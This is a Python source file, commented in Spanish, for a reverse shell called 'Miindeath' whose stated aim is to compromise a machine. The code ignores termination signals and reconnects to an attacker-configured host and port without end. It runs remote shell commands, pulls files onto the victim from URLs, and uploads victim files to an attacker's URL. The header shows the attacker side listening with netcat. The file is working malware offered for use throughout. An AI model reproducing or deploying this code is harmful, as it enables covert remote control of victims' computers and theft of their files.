#!/usr/bin/env python3

# Autor: DtxdF
# Licencia: MIT License
# Descripción: Miindeath (Siglas de MInImalist Death). Es una shell inversa escrita en
#              Python ( 3 ). que trata de ser lo más simple posible para lograr compro
#              meter una máquina.
# Ejemplo de ejecución:
#
#  Victima:
#   $ ./miindeath (En caso que se haya compilado a un ejecutable) o python3 miindeath.py
#
#  Atacante:
#   $ nc -lvvp 4444
#   listening on [any] 4444 ...
#   connect to [127.0.0.1] from localhost [127.0.0.1] 32974
#   (5857): root@10.124.185.221:/home/dtxdf/tmp$ shell whoami
#   root
#   ...
#
# Nota:
#  Por defecto se re-conectara en caso de una perdida de
#  conexión o haya terminado la sesión en la conexión 3:)

import socket
import shlex
import re
from urllib import request, parse
from time import sleep
from urllib3 import disable_warnings
from signal import signal, SIG_IGN
from os import (
                
                getcwd,
                chdir,
                access,
                X_OK,
                R_OK,
                kill,
                getpid,
                name as whoami
                
                )
from os.path import isdir, isfile, basename
from getpass import getuser
from subprocess import Popen, STDOUT, PIPE

SIGKILL = 9 # Lo hago por Windows :p

# No me lastimaras :)

for _ in range(64):

    if (_ != SIGKILL):

        try:

            signal(_, SIG_IGN)

        except Exception as Except:

            #print("Signal Error: {}".format(Except))
            pass

class Config(object):

    RHOST = 'localhost'
    RPORT = 4444
    LIMIT = 0 # 0 Es infinito
    #timeout = 180 # 3 minutos
    # Los bufers de red
    RECV = 1024
    SEND = 1024
    HEADERS = {
            
        'User-Agent':'Hi!, My Name is DtxdF :)'
            
    }
    
    # Claves de los valores POST
    FILENAME = 'filename' # El nombre del archivo
    FILECONTENT = 'filecontent' # El contenido del archivo

    UNIT_SEP = '.AND.' # Cómo si fuera "bash" o una shell 
                       # cualquiera, para ejecutar varios 
                       # comandos internos.
    SLEEP = 15
    RECONNECT = True # Reconectar sí hay una desconexión, doh.

def shell():

    try:

        user = getuser()

    except:

        user = 'null' # En Windows, el usuario "nt-autority/system"
                      # puede causar un error.

    try:

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))

        IP = sock.getsockname()[0]

    except:

        IP = socket.gethostbyname(socket.gethostname())

    return('({}): {}@{}:{}$ '.format(getpid(), user, IP, getcwd()))

def simple_requests(host, method=None, data=None, return_body=True):

    if (data != None):
        
        if not (isinstance(data, dict)):

            raise TypeError('Los parámetros deben ser un diccionario')

        else:

            data = parse.urlencode(data).encode('utf-8')

    construct = request.Request(host, method=method, data=data)
    response = request.urlopen(construct)

    return(response.read() if (return_body) else None)

def check_url(url):

    verify = re.match(r'(http|https)://\w+(:[\d]{1,5})*/{1}.+(\.*.*)*', url)

    if (verify):

        return(True, verify.group(0))

    else:

        return(False, "{}, no es una dirección URL válida".format(url))

def check_file(filename, file=True):

    if (file):

        if (isfile(filename)):

            if not (access(filename, R_OK)):

                return(False, 'No se puede leer este archivo, porque no tiene los permisos necesarios ...')

        else:

            return(False, '{}, no existe o es un directorio'.format(filename))

    else:

        if (isdir(filename)):

            if not (access(filename, X_OK)):

                return(False, 'No se puede acceder a esta ruta, porque no tiene los permisos necesarios ...')

        else:

            return(False, '{}, no existe o no es un directorio'.format(filename))

    return(True, None)

def main():

    rhost = str(Config.RHOST)
    rport = int(Config.RPORT)
    limit = int(Config.LIMIT)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #sock.settimeout(Config.timeout)

    sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
    # Sí está en Windows...
    try:
        sock.setsockopt(socket.SOL_TCP, socket.TCP_QUICKACK, 1)
    except:
        pass
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, Config.RECV)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, Config.SEND)

    while(True):

        try:

            sock.connect((rhost, rport))

        except Exception as Except:

            #print("Connection error: {}".format(Except))

            if (Config.RECONNECT):

                sleep(Config.SLEEP)

            else:

                sys.exit(1)

        else:

            break

    sock.sendall(shell().encode())

    while(True):

        data = ''
        cmd = sock.recv(Config.RECV)

        if not (len(cmd) > 0):

            break # Fallo en la conexión

        else:

            cmds = cmd.decode().strip().split(Config.UNIT_SEP)

            for cmd in cmds:

                cmd = cmd.strip()

                if (cmd):

                    if (cmd[:3].lower() == 'pwd'):

                        data = getcwd()

                    elif (cmd[:5].lower() == 'close'):

                        sock.close()
                        kill(getpid(), SIGKILL)

                    elif (cmd[:8].lower() == 'download'):

                        url = cmd[9:].split(None, 1)

                        if (len(url) >= 1):

                            verify = check_url(url[0])

                            if (verify[0]):

                                if (len(url) == 2):

                                    save_this_name = url[1] if not (url[1] == '') else basename(url[0])

                                else:

                                    save_this_name = basename(url[0])

                                if not (save_this_name.strip() == ''):

                                    try:

                                        with open(save_this_name, 'wb') as file_object:

                                            file_object.write(simple_requests(verify[1]))

                                    except Exception as Except:

                                        raise

                                        data = 'Ocurrio una excepción al descargar a "{}". Excepción: "{}"'.format(save_this_name, Except)

                                    else:

                                        if (isfile(save_this_name)):

                                            data = 'Guardado => {}'.format(save_this_name)

                                        else:
                                            
                                            data = 'No se detecto la existencia de "{}"'.format(save_this_name)

                                else:

                                    data = 'No ha escrito un nombre válido para el archivo a guardar'

                            else:

                                data = verify[1]

                        else:

                            data = '¡La longitud de los parámetros no es correcta!'

                    elif (cmd[:6].lower() == 'upload'):

                        url = cmd[7:].split(None, 1)

                        if (len(url) >= 2):

                            verify_url = check_url(url[0])

                            if (verify_url[0]):

                                verify = check_file(url[1])

                                if (verify[0]):

                                    try:

                                        with open(url[1], 'rb') as file_object:

                                            simple_requests(url[0], 'POST', { 
                                                
                                                                                Config.FILENAME:basename(url[1]),
                                                                                Config.FILECONTENT:file_object.read()
                                                                                
                                                                            }, False)

                                    except Exception as Except:

                                        data = 'Ocurrio un error al subir el archivo "{}". Excepción: "{}"'.format(url[1], Except)

                                    else:

                                        data = '{}, fue subido correctamente'.format(url[1])

                                else:

                                    data = verify[1]

                            else:

                                data = verify_url[1]

                        else:

                            data = '¡Faltan definir parámetros!'

                    elif (cmd[:5].lower() == 'shell'):

                        shell_exec = cmd[6:].strip()

                        if (shell_exec == ''):

                            data = 'No se ha escrito ningún comando'

                        else:

                            try:

                                with Popen(
                                            shlex.split(shell_exec),
                                            shell=(whoami == 'nt'),
                                            stdout=PIPE,
                                            stderr=STDOUT,
                                            universal_newlines=True
                                            
                                            ) as cmd_data:

                                    for _ in cmd_data.stdout.readlines():

                                        sock.sendall(_.encode())

                            except Exception as Except:

                                data = 'Ocurrio una Excepción al ejecutar "{}". Excepción: "{}"'.format(shell_exec, Except)

                    elif (cmd[:2].lower() == 'cd'):

                        path = cmd[3:].strip()

                        if (path == ''):

                            data = 'No se ha escrito ninguna ruta'

                        else:

                            verify = check_file(path, False)

                            if (verify[0]):

                                try:

                                    chdir(path)

                                except Exception as Except:

                                    data = 'Ocurrio una excepción accediendo a la ruta "{}". Excepción: "{}"'.format(path, Except)

                                else:

                                    data = '{} => {}'.format(path, getcwd())

                            else:

                                data = verify[1]

                    else:

                        data = 'No se encontro el comando: "{}"'.format(cmd)

                if not (data == ''):

                    data = '{}\n'.format(data)

                sock.sendall(('{}{}'.format(data, shell())).encode())

    sock.close()

if __name__ == '__main__':

    while(True):

        main()

        if not (Config.RECONNECT):

            break
